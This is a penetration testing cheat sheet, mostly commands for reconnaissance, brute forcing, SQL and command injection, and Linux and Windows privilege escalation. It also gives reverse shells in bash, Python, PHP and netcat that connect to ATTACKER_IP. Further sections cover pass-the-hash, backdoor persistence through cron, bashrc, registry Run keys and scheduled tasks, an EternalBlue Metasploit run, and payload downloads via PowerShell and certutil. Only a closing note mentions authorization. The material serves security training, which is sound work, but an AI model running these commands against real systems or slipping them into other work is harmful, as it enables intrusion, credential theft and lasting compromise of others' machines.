# Penetration Testing Cheat Sheet

A comprehensive reference guide for penetration testing workflows, tools, and techniques.

---

## Table of Contents
- [Reconnaissance](#reconnaissance)
- [Scanning & Enumeration](#scanning--enumeration)
- [Initial Access](#initial-access)
- [Post-Exploitation](#post-exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Lateral Movement](#lateral-movement)
- [Persistence](#persistence)
- [Useful Tools](#useful-tools)

---

## Reconnaissance

### Passive Reconnaissance
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com ANY
nslookup target.com
host -t mx target.com

# Subdomain enumeration
sublist3r -d target.com
amass enum -d target.com

# Search engines
site:target.com
site:target.com filetype:pdf
site:target.com inurl:admin

# Shodan
shodan search "hostname:target.com"

# Certificate transparency
crt.sh
```

### Active Reconnaissance
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Basic port scan
nmap -p- target.com

# Service version detection
nmap -sV -sC target.com

# OS detection
nmap -O target.com
```

---

## Scanning & Enumeration

### Network Scanning
```bash
# Full TCP scan
nmap -p- -T4 -A target.com

# UDP scan
nmap -sU --top-ports 100 target.com

# Vulnerability scan
nmap --script vuln target.com

# All-in-one aggressive scan
nmap -p- -A -T4 -v target.com
```

### Web Enumeration
```bash
# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Nikto web scanner
nikto -h http://target.com

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
ffuf -u http://FUZZ.target.com -w /usr/share/wordlists/subdomains.txt

# Technology detection
whatweb target.com
wappalyzer (browser extension)
```

### Service-Specific Enumeration

#### SMB (Port 445)
```bash
# Enumerate shares
smbclient -L //target.com -N
smbmap -H target.com
enum4linux -a target.com

# Connect to share
smbclient //target.com/share -U username
```

#### FTP (Port 21)
```bash
# Anonymous login
ftp target.com
# Username: anonymous
# Password: anonymous

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target.com
```

#### SSH (Port 22)
```bash
# Banner grab
nc target.com 22

# Brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com
```

#### HTTP/HTTPS (Port 80/443)
```bash
# Check robots.txt
curl http://target.com/robots.txt

# View source code
curl http://target.com

# Check headers
curl -I http://target.com

# Screenshot
eyewitness --web -f urls.txt
```

---

## Initial Access

### Password Attacks
```bash
# Hydra - HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Hydra - SSH
hydra -l root -P passwords.txt ssh://target.com

# Medusa - SSH
medusa -h target.com -u root -P passwords.txt -M ssh

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### SSH Key Cracking
```bash
# Convert encrypted SSH key to John format
ssh2john id_rsa > id_rsa.hash

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Crack with Hashcat
hashcat -m 22921 -a 0 id_rsa /usr/share/wordlists/rockyou.txt

# Use the key
ssh -i id_rsa user@target.com
```

### Web Exploits
```bash
# SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Command Injection
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# File Upload bypass
file.php.jpg
file.php%00.jpg
file.php;.jpg
```

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Listener on attacker machine
nc -lvnp 4444
```

### Upgrade Shell
```bash
# Python PTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Full TTY
python -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Post-Exploitation

### System Enumeration
```bash
# Current user
whoami
id
groups

# System info
uname -a
cat /etc/issue
cat /etc/*release*
hostname

# Network info
ifconfig
ip a
ip route
netstat -antup
ss -tulpn

# Running processes
ps aux
ps -ef

# Users
cat /etc/passwd
cat /etc/shadow
cat /etc/group

# Scheduled tasks
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Installed packages
dpkg -l (Debian/Ubuntu)
rpm -qa (Red Hat/CentOS)
```

### File System Enumeration
```bash
# Find SUID files
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID files
find / -perm -2000 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null

# Find config files
find / -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null

# Search for passwords
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /var/www/ 2>/dev/null
find . -type f -exec grep -i "password" {} + 2>/dev/null

# Check bash history
cat ~/.bash_history
cat /home/*/.bash_history
```

### Enumeration Scripts
```bash
# LinPEAS (Linux)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l2

# WinPEAS (Windows)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
```

---

## Privilege Escalation

### Linux Privilege Escalation

#### Sudo
```bash
# Check sudo permissions
sudo -l

# GTFOBins - exploit sudo
# Visit: https://gtfobins.github.io/
```

#### SUID Binaries
```bash
# Find SUID files
find / -perm -4000 2>/dev/null

# Common exploitable SUID binaries
/bin/bash -p
/usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/vim.basic -c ':py import os; os.execl("/bin/sh", "sh", "-p")'
```

#### Capabilities
```bash
# List capabilities
getcap -r / 2>/dev/null

# Example exploit (cap_setuid)
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Kernel Exploits
```bash
# Check kernel version
uname -a

# Search for exploits
searchsploit linux kernel 4.4.0

# DirtyCow (CVE-2016-5195)
# Works on kernel < 4.8.3
```

#### Cron Jobs
```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Check for writable cron scripts
find /etc/cron* -type f -perm -o+w 2>/dev/null
```

#### LXD/LXC Group
```bash
# Check groups
id

# If in lxd/lxc group:
# On attacker machine:
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine

# Transfer to target, then:
lxc image import alpine*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
cd /mnt/root/root
```

#### Docker Group
```bash
# If in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

#### Writable /etc/passwd
```bash
# Generate password hash
openssl passwd -1 -salt abc password123

# Add user to /etc/passwd
echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch user
su newroot
```

### Windows Privilege Escalation

#### System Info
```powershell
# System info
systeminfo
hostname
whoami /priv
whoami /groups

# Network info
ipconfig /all
route print
netstat -ano

# Users
net user
net localgroup administrators
```

#### AutoRuns
```powershell
# Check startup programs
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Check services
wmic service get name,displayname,pathname,startmode
```

#### Unquoted Service Paths
```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

#### Token Impersonation
```powershell
# Check privileges
whoami /priv

# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
# Use JuicyPotato, PrintSpoofer, or RoguePotato
```

---

## Lateral Movement

### Pass the Hash
```bash
# Using pth-winexe
pth-winexe -U domain/user%hash //target.com cmd

# Using crackmapexec
crackmapexec smb target.com -u user -H hash
```

### SSH Tunneling
```bash
# Local port forwarding
ssh -L 8080:localhost:80 user@target.com

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@target.com

# Remote port forwarding
ssh -R 8080:localhost:80 user@target.com
```

### Port Forwarding with Chisel
```bash
# On attacker machine
./chisel server -p 8000 --reverse

# On target machine
./chisel client ATTACKER_IP:8000 R:1080:socks
```

---

## Persistence

### Linux Persistence
```bash
# SSH keys
mkdir ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Cron job
crontab -e
@reboot /path/to/backdoor.sh

# Bash profile
echo "/path/to/backdoor.sh &" >> ~/.bashrc

# Service
# Create malicious service in /etc/systemd/system/
```

### Windows Persistence
```powershell
# Registry Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

# Scheduled task
schtasks /create /tn "Backdoor" /tr "C:\path\to\backdoor.exe" /sc onlogon /ru System
```

---

## Useful Tools

### Metasploit
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# Meterpreter commands
sysinfo
getuid
hashdump
screenshot
shell
```

### File Transfer

#### Linux to Linux
```bash
# Python HTTP server
python3 -m http.server 8000

# Download on target
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file

# SCP
scp file user@target:/tmp/
```

#### Windows
```powershell
# PowerShell download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file','C:\temp\file')"

# Certutil
certutil -urlcache -f http://ATTACKER_IP/file file

# SMB
# On attacker (Linux)
impacket-smbserver share . -smb2support
# On target (Windows)
copy \\ATTACKER_IP\share\file C:\temp\
```

### Password Cracking Tools
```bash
# John the Ripper
john --wordlist=rockyou.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 0 hash.txt rockyou.txt  # MD5
hashcat -m 1000 hash.txt rockyou.txt  # NTLM
hashcat -m 1800 hash.txt rockyou.txt  # SHA-512

# Hydra
hydra -l admin -P rockyou.txt target.com http-post-form

# CrackStation (online)
# https://crackstation.net/
```

### Network Tools
```bash
# Netcat listener
nc -lvnp 4444

# Port scanning
nc -zv target.com 1-1000

# Banner grabbing
nc target.com 80

# Proxychains
proxychains nmap -sT target.com
```

---

## Common Hash Types

| Hash Type | Hashcat Mode | Example |
|-----------|--------------|---------|
| MD5 | 0 | 5f4dcc3b5aa765d61d8327deb882cf99 |
| SHA1 | 100 | 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 |
| SHA256 | 1400 | 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 |
| NTLM | 1000 | b4b9b02e6f09a9bd760f388b67351e2b |
| bcrypt | 3200 | $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy |

---

## Resources

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries for privilege escalation
- [LOLBAS](https://lolbas-project.github.io/) - Windows binaries for privilege escalation
- [HackTricks](https://book.hacktricks.xyz/) - Comprehensive pentest knowledge
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Useful payloads
- [RevShells](https://www.revshells.com/) - Reverse shell generator
- [CyberChef](https://gchq.github.io/CyberChef/) - Encoding/decoding tool
- [Explain Shell](https://explainshell.com/) - Command line explanation

---

## Notes

- Always get proper authorization before testing
- Document everything during engagements
- Clean up after testing (remove backdoors, restore configs)
- Use legal tools and methods only
- Stay updated with latest CVEs and exploits
